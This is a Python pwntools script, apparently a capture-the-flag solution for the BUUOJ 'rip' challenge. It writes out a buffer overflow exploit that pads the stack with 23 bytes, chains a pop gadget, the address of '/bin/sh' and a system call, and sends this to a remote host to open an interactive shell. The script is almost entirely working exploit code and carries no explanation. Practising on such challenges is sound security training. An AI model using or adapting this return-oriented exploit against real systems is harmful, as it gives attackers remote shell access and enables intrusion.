from pwn import *


def rip(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/rip'):
    context(log_level='debug', arch='amd64', os='linux')
    target = process([file_name])
    target = remote('node5.buuoj.cn', 25564)
    target_elf = ELF(file_name)

    system_plt = p64(0x401191)
    bin_sh_str = p64(next(target_elf.search(b'/bin/sh')))

    pop_ret_gadget = p64(0x4011fb)

    payload = b'A' * 23
    # system('/bin/sh')
    payload += pop_ret_gadget + bin_sh_str + system_plt

    target.sendline(payload)

    target.interactive()


if __name__ == '__main__':
    rip()
